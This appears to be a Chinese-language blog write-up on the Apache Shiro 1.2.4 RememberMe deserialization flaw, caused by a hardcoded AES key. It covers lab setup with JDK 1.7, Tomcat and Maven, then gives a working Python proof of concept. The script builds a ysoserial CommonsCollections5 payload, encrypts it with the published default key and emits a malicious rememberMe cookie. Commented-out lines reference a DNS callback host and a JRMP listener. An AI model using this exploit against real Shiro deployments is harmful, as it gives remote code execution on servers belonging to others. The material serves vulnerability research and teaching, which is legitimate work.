# 简介
Apache
Shiro™是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理。Shiro拥有易于理解的API,您可以快速、轻松地获得任何应用程序——从最小的移动应用程序到最大的网络和企业应用程序。
Shiro
v1.2.4中使用`RememberMe`功能时，使用了`AES`对`Cookie`进行加密，但`AES`密钥硬编码在代码中且不变，因此可以进行加密解密，并触发反序列化漏洞完成任意代码执行。
感觉网上的分析的文章都并不深入，并且在我自己的环境中，发现很多结论感觉都是错的，欢迎打脸ORZ。
# 环境搭建
  * java version "1.7.0_21"，方便使用 ysoserial中的payload
  * Server version: Apache Tomcat/8.5.56，jdk1.7支持tomcat8
  * shiro-root-1.2.4，9549384b0d7b77b87733892ab00b94cc31019444，漏洞分支
  * commons-collections4，适用于ysoserial中的payload
使用Apache Shiro Quickstart示例页面进行测试
    git clone https://github.com/apache/shiro.git
    git checkout shiro-root-1.2.4  #切换分支
使用`shiro/samples/web`示例项目目录，`IDEA`导入并进行设置。
配置`~/.m2/toolchains.xml`，添加jdk
        jdk
          1.7
          sun
          /Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/
配置pom.xml，添加依赖库
            org.apache.shiro.samples
            shiro-samples
            1.2.4
            ../pom.xml
        4.0.0
        samples-web
        Apache Shiro :: Samples :: Web
        war
                    org.apache.maven.plugins
                    maven-toolchains-plugin
                    1.1
                                toolchain
                                1.7
                                sun
                    maven-surefire-plugin
                        never
                    org.mortbay.jetty
                    maven-jetty-plugin
                    ${jetty.version}
                        /
                                9080
                                60000
                            ./target/yyyy_mm_dd.request.log
                            90
                            true
                            false
                            GMT
                javax.servlet
                servlet-api
                provided
                org.slf4j
                slf4j-log4j12
                runtime
                log4j
                log4j
                runtime
                net.sourceforge.htmlunit
                htmlunit
                2.6
                test
                org.apache.shiro
                shiro-core
                org.apache.shiro
                shiro-web
                org.mortbay.jetty
                jetty
                ${jetty.version}
                test
                org.mortbay.jetty
                jsp-2.1-jetty
                ${jetty.version}
                test
                org.slf4j
                jcl-over-slf4j
                runtime
                org.apache.commons
                commons-collections4
                4.0
下载[JSTL标签库](http://archive.apache.org/dist/jakarta/taglibs/standard/binaries/下载JSTL包的ZIP文件，下载最新的jakarta-taglibs-standard-1.1.2.zip)，导入到IDEA中
IDEA中添加设置tomcat服务器：
运行成功：
生成Cookie的POC:
    import base64
    import uuid
    import subprocess
    from Crypto.Cipher import AES
    def rememberme(command):
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
        popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections5', command],
                                 stdout=subprocess.PIPE)
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
    if __name__ == '__main__':
        # payload = encode_rememberme('127.0.0.1:12345')
        payload = rememberme('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
        # payload = encode_rememberme('http://shiro.f422cd57.n0p.co')
        with open("./payload.cookie", "w") as fpw:
            print("rememberMe={}".format(payload.decode()))